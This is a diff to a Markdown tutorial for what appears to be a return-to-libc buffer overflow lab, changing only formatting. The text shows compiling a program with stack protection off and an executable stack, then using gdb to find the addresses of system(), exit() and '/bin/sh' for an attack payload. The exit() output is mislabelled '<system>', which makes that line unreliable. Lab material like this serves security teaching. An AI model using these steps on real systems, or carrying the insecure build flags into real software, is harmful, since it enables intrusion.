@@ -25,6 +25,7 @@ gcc -m32 -fno-stack-protector -z execstack -o stack stack.c
 ```
 
 ### Explanation:
+
 - `-m32` 👉 Compiles as 32-bit code (if your `libc` is 32-bit).
 - `-fno-stack-protector` 👉 Disables canary protection.
 - `-z execstack` 👉 Allows execution of code on the stack (for shellcode).
@@ -40,7 +41,7 @@ First, run `stack` to ensure it reads `badfile` correctly:
 
 Since `badfile` has not been created yet, `stack` may output:
 
-```
+```bash
 Segmentation fault (core dumped)
 ```
 
@@ -56,35 +57,36 @@ gdb stack
 
 Inside `gdb`, run:
 
-```gdb
+```bash
 (gdb) b foo
 (gdb) r
 ```
 
 Then check the address of `system()`:
 
-```gdb
+```bash
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e42da0 <system>
 ```
+
 Record this address (e.g., `0xf7e42da0`) as it will be used to craft the attack payload.
 
 Then check the address of `exit()`:
 
-```gdb
+```bash
 (gdb) p exit
 $1 = {<text variable, no debug info>} 0xb7e369d0 <system>
 ```
 
 You can also locate the address of `"/bin/sh"` in `libc`:
 
-```gdb
+```bash
 (gdb) find 0xf7e00000, 0xf7ffffff, "/bin/sh"
 ```
 
 It may output:
 
-```
+```bash
 0xf7f4d890
 ```
 
